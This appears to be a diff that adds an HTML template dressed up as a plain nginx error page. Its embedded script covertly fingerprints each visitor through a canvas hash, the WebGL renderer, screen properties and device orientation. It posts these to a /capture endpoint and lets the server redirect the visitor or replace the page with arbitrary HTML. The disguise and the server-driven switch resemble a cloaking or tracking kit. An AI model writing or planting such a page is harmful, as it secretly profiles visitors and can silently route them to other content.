@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>{{ title }}</title>
+<style>
+body { margin: 0; background: #fff; color: #333; font-family: sans-serif; }
+.center { text-align: center; }
+h1 { margin: 1em 0 0.2em; font-size: 1.5em; font-weight: normal; }
+hr { border: none; border-top: 1px solid #ccc; margin: 1em 0; }
+.nginx { font-size: 0.9em; color: #666; }
+</style>
+</head>
+<body>
+<div class="center">
+<h1>{{ code }} {{ message }}</h1>
+<hr>
+<center class="nginx">nginx/1.24.0</center>
+</div>
+<script>
+(function(){
+  var hitId = {{ hit_id }};
+  function hash(s) {
+    var h = 0;
+    for (var i = 0; i < s.length; i++) {
+      h = ((h << 5) - h) + s.charCodeAt(i) | 0;
+    }
+    return (h >>> 0).toString(16);
+  }
+  function canvasFingerprint() {
+    try {
+      var c = document.createElement('canvas');
+      c.width = 220; c.height = 30;
+      var ctx = c.getContext('2d');
+      if (!ctx) return null;
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(0, 0, 100, 30);
+      ctx.fillStyle = '#069';
+      ctx.fillText('nginx', 2, 15);
+      ctx.fillStyle = 'rgba(0,0,0,0.5)';
+      ctx.fillText('404', 4, 17);
+      return hash(c.toDataURL('image/png').slice(-500));
+    } catch (e) { return null; }
+  }
+  function webglRenderer() {
+    try {
+      var c = document.createElement('canvas');
+      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if (!gl) return null;
+      var d = gl.getExtension('WEBGL_debug_renderer_info');
+      return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
+    } catch (e) { return null; }
+  }
+  function screenInfo() {
+    return {
+      width: screen.width,
+      height: screen.height,
+      colorDepth: screen.colorDepth,
+      pixelRatio: typeof devicePixelRatio !== 'undefined' ? devicePixelRatio : null
+    };
+  }
+  function orientationInfo(cb) {
+    var o = { alpha: null, beta: null, gamma: null };
+    var done = false;
+    function finish() { if (!done) { done = true; cb(o); } }
+    if (typeof DeviceOrientationEvent === 'undefined') { finish(); return; }
+    try {
+      var once = function(ev) {
+        o.alpha = ev.alpha; o.beta = ev.beta; o.gamma = ev.gamma;
+        window.removeEventListener('deviceorientation', once);
+        finish();
+      };
+      window.addEventListener('deviceorientation', once);
+      setTimeout(function() {
+        window.removeEventListener('deviceorientation', once);
+        finish();
+      }, 800);
+    } catch (e) { finish(); }
+  }
+  function sendCapture() {
+    var payload = {
+      hit_id: hitId,
+      canvas_hash: canvasFingerprint(),
+      webgl_renderer: webglRenderer(),
+      screen: screenInfo()
+    };
+    orientationInfo(function(o) {
+      payload.orientation = o;
+      fetch('/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).then(function(res) { return res.ok ? res.json() : Promise.reject(); }).then(function(data) {
+        if (!data || typeof data.action !== 'string') return;
+        if (data.action === 'redirect' && data.redirect_url) {
+          window.location.replace(data.redirect_url);
+          return;
+        }
+        if (data.action === 'error' && data.status_code) {
+          var code = parseInt(data.status_code, 10);
+          if (data.html != null) {
+            document.open();
+            document.write(data.html);
+            document.close();
+          } else {
+            window.location.replace('/error/' + code);
+          }
+        }
+      }).catch(function() {});
+    });
+  }
+  sendCapture();
+})();
+</script>
+</body>
+</html>
